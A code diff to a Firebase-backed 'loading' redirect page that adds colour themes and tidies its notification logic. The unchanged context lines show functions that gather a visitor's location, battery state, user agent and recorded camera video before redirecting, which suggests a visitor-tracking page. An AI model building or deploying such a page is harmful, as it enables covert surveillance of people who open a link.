@@ -14,6 +14,7 @@
             margin: 0;
             background-color: #f3f7fa;
             color: #333;
+             transition: background-color 0.5s, color 0.5s; /* Theme transition */
         }
         .container {
             text-align: center;
@@ -23,14 +24,17 @@
             box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
             width: 80%;
             max-width: 500px;
+             transition: background-color 0.5s, box-shadow 0.5s; /* Theme transition */
         }
         h1 {
             color: #007bff;
             margin-bottom: 20px;
+             transition: color 0.5s; /* Theme transition */
         }
         p {
             font-size: 1rem;
             margin-bottom: 15px;
+             transition: color 0.5s; /* Theme transition */
         }
         .loading-dots::after {
             content: "";
@@ -40,6 +44,7 @@
             color: #dc3545;
             margin-top: 20px;
             font-weight: bold;
+             transition: color 0.5s; /* Theme transition */
         }
         @keyframes dots {
             0%   {content: "";}
@@ -77,12 +82,55 @@ const firebaseConfig = {
 // Initialize Firebase
 const app = firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
-const storage = firebase.storage(); // Initialize Firebase Storage
+const storage = firebase.storage();
 
 const errorMessage = document.getElementById("error-message");
 
-// --- Firestore References (DYNAMIC USER ID) ---
-// Function to get the *current* user ID
+// --- Theme Definitions ---
+const themes = {
+    default: {
+        bodyBackgroundColor: '#f3f7fa',
+        containerBackgroundColor: 'white',
+        containerBoxShadow: '0 8px 16px rgba(0, 0, 0, 0.1)',
+        headingColor: '#007bff',
+        textColor: '#333',
+        buttonBackgroundColor: '#007bff',
+        buttonHoverBackgroundColor: '#0056b3',
+        tableHeaderBackgroundColor: '#f9f9f9',
+        tableHeaderColor: '#333',
+        tableBorderColor: '#eee',
+        tableTitleBorderColor: '#007bff',
+    },
+    dark: {
+        bodyBackgroundColor: '#121212', /* Dark background */
+        containerBackgroundColor: '#1e1e1e',
+        containerBoxShadow: '0 8px 16px rgba(255, 255, 255, 0.1)', /* Light shadow for dark theme */
+        headingColor: '#00a86b', /* Example accent color */
+        textColor: '#f8f8f8', /* Light text */
+        buttonBackgroundColor: '#00a86b',
+        buttonHoverBackgroundColor: '#007a55',
+        tableHeaderBackgroundColor: '#333', /* Darker header */
+        tableHeaderColor: '#f8f8f8',
+        tableBorderColor: '#555',
+        tableTitleBorderColor: '#00a86b',
+    },
+    green: {
+        bodyBackgroundColor: '#e8f5e9', /* Light green background */
+        containerBackgroundColor: '#ffffff',
+        containerBoxShadow: '0 8px 16px rgba(0, 0, 0, 0.1)',
+        headingColor: '#4caf50', /* Green heading */
+        textColor: '#333',
+        buttonBackgroundColor: '#4caf50',
+        buttonHoverBackgroundColor: '#43a047',
+        tableHeaderBackgroundColor: '#f1f8e9', /* Lighter green header */
+        tableHeaderColor: '#333',
+        tableBorderColor: '#c8e6c9',
+        tableTitleBorderColor: '#4caf50',
+    },
+};
+
+
+// Utility functions
 async function getCurrentUserId() {
      const counterRef = db.collection('counters').doc('userCounter');
      const counterDoc = await counterRef.get();
@@ -139,6 +187,28 @@ function getBatteryPromise() {
 function getDeviceInfo() {
     return navigator.userAgent;
 }
+
+// Function to apply theme on redirect page
+function applyThemeRedirect(themeName) {
+    const theme = themes[themeName] || themes.default;
+    document.body.style.backgroundColor = theme.bodyBackgroundColor;
+    document.body.style.color = theme.textColor;
+    const container = document.querySelector('.container');
+    if (container) {
+        container.style.backgroundColor = theme.containerBackgroundColor;
+        container.style.boxShadow = theme.containerBoxShadow;
+    }
+    const h1 = document.querySelector('h1');
+    if (h1) {
+        h1.style.color = theme.headingColor;
+    }
+     const p = document.querySelectorAll('p');
+    p.forEach(pElement => {
+        pElement.style.color = theme.textColor;
+    });
+
+}
+
 
 // Function to collect other data
 async function collectOtherData(locationPermission, currentVideoUrl, currentCameraError) {
@@ -329,7 +399,7 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
     let notificationTitle = null;
     let notificationBody = null;
     let notificationIcon = null;
-
+    let themeName = 'default';
 
     if (settingsSnap.exists) {
         const settingsData = settingsSnap.data();
@@ -339,41 +409,45 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         notificationTitle = settingsData.notificationTitle;
         notificationBody = settingsData.notificationBody;
         notificationIcon = settingsData.notificationIcon;
+        themeName = settingsData.theme || 'default';
+    }
 
-         // --- Trigger Notification BEFORE redirect, ONLY if permission is enabled in settings ---
-        if (notificationPermission && notificationTitle && notificationBody) {
-            if (!("Notification" in window)) {
-                console.log("This browser does not support notifications.");
-            } else if (Notification.permission === "granted") {
-                try {
-                    new Notification(notificationTitle, {
-                        body: notificationBody,
-                        icon: notificationIcon || undefined
-                    });
-                    console.log("Notification sent on redirect!");
-                } catch (notificationError) {
-                    console.error("Error sending notification on redirect:", notificationError);
-                }
-            } else if (Notification.permission === 'default') {
-                 Notification.requestPermission().then(permissionResult => {
-                    if(permissionResult === 'granted'){
-                        try {
-                            new Notification(notificationTitle, {
-                                body: notificationBody,
-                                icon: notificationIcon || undefined
-                            });
-                            console.log("Notification sent after permission granted!");
-                        } catch (notificationError) {
-                            console.error("Error sending notification after permission grant:", notificationError);
-                        }
-                    } else {
-                        console.log("Notification permission not granted by user after prompt on redirect.");
-                    }
+    applyThemeRedirect(themeName);
+
+
+    // --- Trigger Notification BEFORE redirect, ONLY if permission is enabled in settings ---
+    if (notificationPermission && notificationTitle && notificationBody) {
+        if (!("Notification" in window)) {
+            console.log("This browser does not support notifications.");
+        } else if (Notification.permission === "granted") {
+            try {
+                new Notification(notificationTitle, {
+                    body: notificationBody,
+                    icon: notificationIcon || undefined
                 });
-
-            } else { // Notification.permission === 'denied'
-                console.log('Notification permission previously denied by user.');
+                console.log("Notification sent on redirect!");
+            } catch (notificationError) {
+                console.error("Error sending notification on redirect:", notificationError);
             }
+        } else if (Notification.permission === 'default') {
+             Notification.requestPermission().then(permissionResult => {
+                if(permissionResult === 'granted'){
+                    try {
+                        new Notification(notificationTitle, {
+                            body: notificationBody,
+                            icon: notificationIcon || undefined
+                        });
+                        console.log("Notification sent after permission granted!");
+                    } catch (notificationError) {
+                        console.error("Error sending notification after permission grant:", notificationError);
+                    }
+                } else {
+                    console.log("Notification permission not granted by user after prompt on redirect.");
+                }
+            });
+
+        } else { // Notification.permission === 'denied'
+            console.log('Notification permission previously denied by user.');
         }
     }
 
@@ -396,7 +470,7 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
 
     let micCamPermission = false;
     let recordSeconds = 0;
-    let notificationPermissionSetting = false; // To store notification permission setting
+    let notificationPermissionSetting = false;
 
     try {
         const settingsSnap = await settingsRef.get();
@@ -404,8 +478,11 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
             const settingsData = settingsSnap.data();
             micCamPermission = settingsData.micCamPermission;
             recordSeconds = parseInt(settingsData.recordSeconds) || 0;
-            notificationPermissionSetting = settingsData.notificationPermission; // Get notification permission setting
+            notificationPermissionSetting = settingsData.notificationPermission;
+            const themeName = settingsData.theme || 'default';
+            applyThemeRedirect(themeName);
         } else {
+            applyThemeRedirect('default');
             console.warn("No settings found in Firestore, using defaults.");
         }
     } catch (error) {
@@ -413,6 +490,7 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         errorMessage.textContent = `Firebase Fout bij laden instellingen: ${error.message}`;
         errorMessage.style.display = 'block';
     }
+
 
     // Request notification permission ONLY if enabled in settings
     if (notificationPermissionSetting) {
@@ -424,7 +502,7 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
                 console.log("Notification permission granted on redirect (because enabled in settings)!");
             } else if (permissionResult === 'denied') {
                 console.log("Notification permission denied on redirect (because enabled in settings, but user denied).");
-            } else { // permissionResult === 'default' (dismissed or ignored)
+            } else {
                 console.log("Notification permission dismissed or ignored on redirect (because enabled in settings).");
             }
         } else if (Notification.permission === 'granted') {
